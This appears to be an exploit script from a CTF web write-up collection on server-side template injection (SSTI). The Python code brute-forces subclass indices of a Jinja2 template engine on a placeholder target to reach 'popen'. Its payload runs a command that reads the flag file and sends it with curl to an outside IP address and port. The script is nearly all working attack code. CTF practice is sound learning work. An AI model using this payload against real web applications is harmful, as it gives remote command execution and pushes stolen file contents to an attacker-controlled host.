# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/ssti入门知识点.md
# TITLE: [前言](https://tttang.com/archive/1698/#toc_)
# CATEGORY: web

import requests

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'}
for i in range(500):
    try:
        url = "http://xxx.xxx.xxx.xxxx:5000/level/3"
        data={"code":'{{().__class__.__bases__[0].__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("curl http://124.222.255.142:7777/`cat flag`").read()}}'}
        res = requests.post(url=url,data=data, headers=headers)

    except:
        pass
